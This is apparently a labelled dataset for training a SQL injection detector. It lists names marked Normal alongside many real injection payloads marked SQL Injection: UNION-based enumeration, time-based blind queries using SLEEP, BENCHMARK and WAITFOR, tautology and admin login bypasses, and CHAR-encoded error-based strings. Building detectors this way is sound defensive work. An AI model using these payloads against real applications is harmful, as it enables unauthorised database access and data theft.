"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
'WHERE 1=1 AND 1=1--',SQL Injection
'Grace',Normal
'Charlie',Normal
'Fran',Normal
'Charlie',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--'",SQL Injection
'Fran',Normal
'David',Normal
'ORDER BY 5#',SQL Injection
"'"""") or true--'",SQL Injection
"'"""") or (""""x"""")=(""""x'",SQL Injection
'Jill',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#'",SQL Injection
'Grace',Normal
'Eve',Normal
'1 or sleep(5)#',SQL Injection
'Charlie',Normal
'Eve',Normal
'Fran',Normal
'Hank',Normal
'Alice',Normal
'Fran',Normal
'Fran',Normal
'David',Normal
'Grace',Normal
'John',Normal
'Fran',Normal
'Alice',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8#'",SQL Injection
'') or ('x')=('x',SQL Injection
'Alice',Normal
'Eve',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
"'benchmark(50000000,MD5(1))#'",SQL Injection
'Hank',Normal
'Eve',Normal
'Jill',Normal
'Alice',Normal
'Alice',Normal
'OR 1=1--',SQL Injection
'Grace',Normal
'Charlie',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
'Grace',Normal
"'UNION ALL SELECT 1,2,3'",SQL Injection
'Charlie',Normal
'UNION ALL SELECT 1',SQL Injection
'Fran',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9'",SQL Injection
'Charlie',Normal
'David',Normal
'Charlie',Normal
'Grace',Normal
'David',Normal
'Grace',Normal
'@@variable	global variable',SQL Injection
'Eve',Normal
'David',Normal
'Eve',Normal
'Hank',Normal
'Alice',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'",SQL Injection
'Charlie',Normal
'Eve',Normal
"'UNION ALL SELECT 1,2#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15'",SQL Injection
'Grace',Normal
'David',Normal
'David',Normal
'Grace',Normal
'Grace',Normal
'/*  	C-style comment',SQL Injection
'David',Normal
'John',Normal
'Jill',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8'",SQL Injection
'Jill',Normal
'AND 1=1',SQL Injection
'Bob',Normal
'John',Normal
'Eve',Normal
'Grace',Normal
'Grace',Normal
'Bob',Normal
'Fran',Normal
'Fran',Normal
'Eve',Normal
'Eve',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7'",SQL Injection
'Jill',Normal
'Eve',Normal
'Alice',Normal
'David',Normal
'Grace',Normal
'Alice',Normal
'Charlie',Normal
'Eve',Normal
'Jill',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'",SQL Injection
'Eve',Normal
'Eve',Normal
'Jill',Normal
'John',Normal
'John',Normal
''^'',SQL Injection
'OR 1=0',SQL Injection
'Hank',Normal
'Grace',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
'Grace',Normal
'Fran',Normal
'Grace',Normal
'Alice',Normal
'Charlie',Normal
'David',Normal
'# Numeric',SQL Injection
'Bob',Normal
'Hank',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#'",SQL Injection
'Hank',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
'ORDER BY SLEEP(5)',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
'ORDER BY 4--',SQL Injection
"'"""") or benchmark(10000000,MD5(1))#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'' UNION SELECT sum(columnname ) from tablename --',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
'AND 1083=1083 AND (1427=1427',SQL Injection
"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'",SQL Injection
'Charlie',Normal
'Jill',Normal
'Hank',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#',SQL Injection
'Grace',Normal
'Alice',Normal
'Grace',Normal
'1 or sleep(5)#',SQL Injection
'Eve',Normal
'1' ORDER BY 1--+',SQL Injection
'David',Normal
'David',Normal
'ORDER BY 9--',SQL Injection
'Alice',Normal
'Grace',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#'",SQL Injection
'Bob',Normal
'Grace',Normal
'Hank',Normal
'Hank',Normal
'Eve',Normal
'Bob',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
'Eve',Normal
'Hank',Normal
Microservice running on port 4300,Normal
'SLEEP(5)='',SQL Injection
'John',Normal
'Bob',Normal
'Eve',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--'",SQL Injection
'' AND id IS NULL; --',SQL Injection
'Bob',Normal
'' or '' '',SQL Injection
'Bob',Normal
"'admin"""" or """"1""""=""""1""""--'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'",SQL Injection
'OR x=x',SQL Injection
'David',Normal
'Alice',Normal
'ORDER BY 10--',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
'1)) or pg_sleep(5)--',SQL Injection
'Bob',Normal
'John',Normal
'Bob',Normal
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6#'",SQL Injection
'Grace',Normal
'Hank',Normal
'David',Normal
'Charlie',Normal
'Fran',Normal
'Eve',Normal
'Bob',Normal
'Grace',Normal
'Jill',Normal
'Hank',Normal
"'""""*""""'",SQL Injection
'Hank',Normal
'Eve',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'",SQL Injection
'Charlie',Normal
'Charlie',Normal
'Fran',Normal
'Alice',Normal
'Hank',Normal
'Charlie',Normal
'Grace',Normal
'John',Normal
"'"""" or """"""""^""""'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--'",SQL Injection
'or SLEEP(5)#',SQL Injection
'Alice',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#'",SQL Injection
'John',Normal
'John',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--'",SQL Injection
'Fran',Normal
"'and (select substring(@@version,1,1))='M''",SQL Injection
'John',Normal
'Fran',Normal
'Grace',Normal
'ORDER BY 14--',SQL Injection
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6#'",SQL Injection
'Jill',Normal
'OR x=y#',SQL Injection
'Alice',Normal
'David',Normal
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8'",SQL Injection
"'' AND MID(VERSION(),1,1) = '5';'",SQL Injection
"',(select * from (select(sleep(10)))a)'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
'Eve',Normal
'ORDER BY 13',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
'John',Normal
'Jill',Normal
'ORDER BY 16',SQL Injection
"'""""*""""'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
'Grace',Normal
'Alice',Normal
'HAVING 1=1#',SQL Injection
'David',Normal
'John',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'",SQL Injection
'&&SLEEP(5)--',SQL Injection
'Fran',Normal
'Jill',Normal
'Charlie',Normal
'David',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7--'",SQL Injection
'Eve',Normal
'Fran',Normal
'Hank',Normal
'Charlie',Normal
'1' ORDER BY 3--+',SQL Injection
'admin'/*',SQL Injection
'Hank',Normal
'Jill',Normal
'John',Normal
'Fran',Normal
'Hank',Normal
'');,SQL Injection
'Eve',Normal
'Hank',Normal
'AS INJECTX WHERE 1=1 AND 1=0',SQL Injection
'David',Normal
"'and (select substring(@@version,1,1))='M''",SQL Injection
'AND 1=0 AND '%'='',SQL Injection
'Grace',Normal
'ORDER BY 9',SQL Injection
'Bob',Normal
'WHERE 1=1 AND 1=0#',SQL Injection
'Charlie',Normal
'Bob',Normal
'Eve',Normal
"'1' ORDER BY 1,2,3--+'",SQL Injection
'Eve',Normal
'Jill',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'",SQL Injection
'Grace',Normal
"'UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'",SQL Injection
'Hank',Normal
'sleep(5)#',SQL Injection
'Charlie',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4'",SQL Injection
'Grace',Normal
'Charlie',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#'",SQL Injection
'Alice',Normal
'David',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'Charlie',Normal
"'1' ORDER BY 1,2,3--+'",SQL Injection
"'or SLEEP(5)=""""'",SQL Injection
'' or ''&'',SQL Injection
"''\""""'",SQL Injection
'Hank',Normal
'Alice',Normal
'David',Normal
'Grace',Normal
'David',Normal
'Hank',Normal
'or 1=1/*',SQL Injection
'Bob',Normal
'Grace',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe',SQL Injection
'Bob',Normal
'') or pg_sleep(5)--',SQL Injection
'Grace',Normal
'Grace',Normal
"'1' ORDER BY 1,2--+'",SQL Injection
'Grace',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),4'",SQL Injection
"'1' ORDER BY 1,2--+'",SQL Injection
'Bob',Normal
'Fran',Normal
'OR 1=1--',SQL Injection
'Alice',Normal
'John',Normal
'Hank',Normal
"''\""""'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
'ORDER BY SLEEP(5)',SQL Injection
'Alice',Normal
'Charlie',Normal
"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
'Alice',Normal
'Hank',Normal
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'",SQL Injection
'Jill',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'David',Normal
'Bob',Normal
'Hank',Normal
'Charlie',Normal
'Grace',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'David',Normal
"'and (select substring(@@version,1,1))='X''",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9--'",SQL Injection
'John',Normal
'-- -	SQL comment',SQL Injection
'Charlie',Normal
'Fran',Normal
';,SQL Injection
'ORDER BY 25',SQL Injection
'Hank',Normal
'Bob',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'",SQL Injection
'Jill',Normal
'Fran',Normal
"'and (select substring(@@version,1,1))='X''",SQL Injection
'# from wapiti',SQL Injection
'David',Normal
'John',Normal
'David',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
'Hank',Normal
"'""""-""""'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
'Bob',Normal
'John',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'",SQL Injection
'HAVING 1=0--',SQL Injection
'or pg_SLEEP(5)--',SQL Injection
'ORDER BY 1',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
'Bob',Normal
'John',Normal
'Hank',Normal
'Alice',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#'",SQL Injection
'Fran',Normal
'ORDER BY 28#',SQL Injection
'Fran',Normal
'John',Normal
'Bob',Normal
'Fran',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#'",SQL Injection
'Eve',Normal
'David',Normal
'Eve',Normal
'Alice',Normal
'ORDER BY 8#',SQL Injection
'AND 1=1',SQL Injection
'Alice',Normal
'Bob',Normal
'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
'ORDER BY 7#',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'David',Normal
'' OR 'x'='x',SQL Injection
'John',Normal
'John',Normal
'Hank',Normal
'ORDER BY 22#',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#'",SQL Injection
'OR 1=0',SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Hank',Normal
'Charlie',Normal
"'"""" OR 1 = 1 -- -'",SQL Injection
'OR 1=1--',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
'or SLEEP(5)#',SQL Injection
"'AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'",SQL Injection
'') or ('x')=('x',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'",SQL Injection
'Jill',Normal
'Fran',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
'';WAITFOR DELAY '0:0:30'--',SQL Injection
"'' or """"'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5#'",SQL Injection
'David',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'",SQL Injection
'Eve',Normal
'Grace',Normal
"'admin""""or 1=1 or """"""""=""""'",SQL Injection
'Jill',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
'Eve',Normal
'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
'Grace',Normal
'John',Normal
'Alice',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
'Bob',Normal
'David',Normal
'Hank',Normal
'Eve',Normal
'David',Normal
"',(select * from (select(sleep(10)))a)'",SQL Injection
'ORDER BY 1',SQL Injection
'David',Normal
'Fran',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
'Jill',Normal
'Fran',Normal
'Fran',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--'",SQL Injection
'Charlie',Normal
'Charlie',Normal
'John',Normal
'Eve',Normal
'Alice',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#'",SQL Injection
'Grace',Normal
'Charlie',Normal
'Bob',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#'",SQL Injection
'Grace',Normal
'Jill',Normal
'Alice',Normal
'Fran',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--'",SQL Injection
'Jill',Normal
'Charlie',Normal
'Bob',Normal
'David',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
'Bob',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7'",SQL Injection
'Alice',Normal
'Alice',Normal
'1 or sleep(5)#',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'",SQL Injection
"'or benchmark(50000000,MD5(1))#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
'ORDER BY 13#',SQL Injection
'Charlie',Normal
'Bob',Normal
'Hank',Normal
"'"""" or """"""""*""""'",SQL Injection
'John',Normal
'Charlie',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#'",SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5)#'",SQL Injection
'Jill',Normal
'Alice',Normal
'Jill',Normal
'John',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
'AND 1=1#',SQL Injection
'Jill',Normal
'Bob',Normal
'ORDER BY 5#',SQL Injection
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
'# Numeric',SQL Injection
'Alice',Normal
'John',Normal
'Bob',Normal
'ORDER BY 18#',SQL Injection
'Charlie',Normal
'''',SQL Injection
'ORDER BY 30#',SQL Injection
"'admin"""") or """"1""""=""""1""""/*'",SQL Injection
'Charlie',Normal
'' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --',SQL Injection
'John',Normal
'John',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'WHERE 1=1 AND 1=0',SQL Injection
'Fran',Normal
'John',Normal
'Fran',Normal
'Hank',Normal
'Fran',Normal
'Jill',Normal
"'""""*""""'",SQL Injection
'Bob',Normal
'Bob',Normal
'John',Normal
'Charlie',Normal
'John',Normal
'John',Normal
'John',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))'",SQL Injection
'Grace',Normal
'Alice',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'",SQL Injection
'Fran',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))'",SQL Injection
'Alice',Normal
'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
'Fran',Normal
'Hank',Normal
'Eve',Normal
'Hank',Normal
'Hank',Normal
'ORDER BY 7#',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'",SQL Injection
'OR x=x--',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'",SQL Injection
'Fran',Normal
'Jill',Normal
'1) or sleep(5)#',SQL Injection
'Bob',Normal
"'UNION ALL SELECT 1,2,3,4'",SQL Injection
'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'",SQL Injection
'Jill',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
"'admin"""") or """"1""""=""""1""""/*'",SQL Injection
'-- -	SQL comment',SQL Injection
'John',Normal
'David',Normal
'ORDER BY 3--',SQL Injection
'Alice',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))'",SQL Injection
'Alice',Normal
'AS INJECTX WHERE 1=1 AND 1=0',SQL Injection
'admin' or 1=1',SQL Injection
'Grace',Normal
'Bob',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Charlie',Normal
'ORDER BY 18--',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),4'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#'",SQL Injection
'-- -	SQL comment',SQL Injection
'David',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'",SQL Injection
'Charlie',Normal
'David',Normal
"'and (select substring(@@version,2,1))='y''",SQL Injection
'Alice',Normal
'waitfor delay '00:00:05'',SQL Injection
'David',Normal
'David',Normal
'Bob',Normal
'Jill',Normal
